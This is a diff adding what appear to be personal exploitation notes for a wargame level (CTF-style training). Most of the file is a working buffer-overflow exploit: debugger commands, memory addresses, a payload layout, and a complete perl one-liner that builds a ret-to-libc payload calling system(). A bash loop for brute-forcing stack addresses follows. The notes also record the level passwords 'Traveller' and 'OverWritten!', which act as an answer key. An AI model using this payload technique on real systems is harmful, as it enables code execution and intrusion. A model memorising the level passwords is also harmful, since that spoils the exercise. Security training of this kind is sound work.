@@ -1,0 +1,43 @@
+pass: Traveller
+
+//temp strings
+x/20x 0xbffffbf0
+break *0x0804852b
+//
+
+0..10200: 
+	writes in fixedbuf
+10200..10300: 
+	writes 40 in fixedbuf 
+	rewrites 60 in buf[0..59]
+10300..10400: 
+	rewrites 40 in buf[60..99]
+	10340-10341:
+		i=39, len = 100 
+	10341-10342:
+
+
+fh = 0x804a008
+str_ed = 0x8048250
+system_addr = 0xb7ee59b0
+possible_ptr+7 = 0xbffffbf3(write f2)
+ret = 0xbfffd380 + 4
+
+==> PAYLOAD:
+A - write in fixedbuf(replaced with system_addr and args)
+B - finish the fixed buf, write 60 in buf
+C - write 40 in buf[60..99]
+\x02 - interupt to discard invalid buf
+D - dummy(for alignement)
+\x02\x02\x02 - no more read calls, len filled.
+pack("III", fh, ptr+7, 0xff(to make i > len))
+D-dummy(for alignement)
+pack(payload)
+
+perl -e 'print pack("IIII", 0xb7ee59b0, 0x8048250, 0x8048250, 0xdeadc0de)x(10200/16),"B"x108,"C"x40,"\x02","D"x59,"\x02\x02\x02",pack("III",0x804a008,0xf2,0xff),"D"x85,pack("I",0xbfffd384)x8,pack("II",0x8048250,0x8048250)' > somefile
+
+//bruteforcing stack addrs
+for i in {1..1000}; do export x=`perl -e 'print "a"x'$i`; ~/list; done 
+
+level6_pass: OverWritten!
+
